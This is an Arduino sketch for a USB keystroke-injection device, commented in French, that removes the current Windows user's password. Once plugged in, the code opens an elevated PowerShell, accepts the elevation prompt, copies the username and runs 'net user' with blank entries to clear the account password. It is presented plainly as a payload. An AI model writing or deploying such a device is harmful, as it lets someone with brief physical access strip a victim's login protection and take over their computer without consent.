#include <Keyboard.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  
  Keyboard.begin();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  // Désactiver le mot de passe windows

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  delay(150);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();

  delay(150);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("$env:UserName ");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('-');
  Keyboard.releaseAll();
   
  Keyboard.print(" clip");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("net user ");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('v');
  Keyboard.releaseAll();

  delay(150);

  typeKey(KEY_BACKSPACE);

  Keyboard.print(" *");

  typeKey(KEY_RETURN);

  delay(150);

  typeKey(KEY_RETURN);

  delay(100);
  
  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
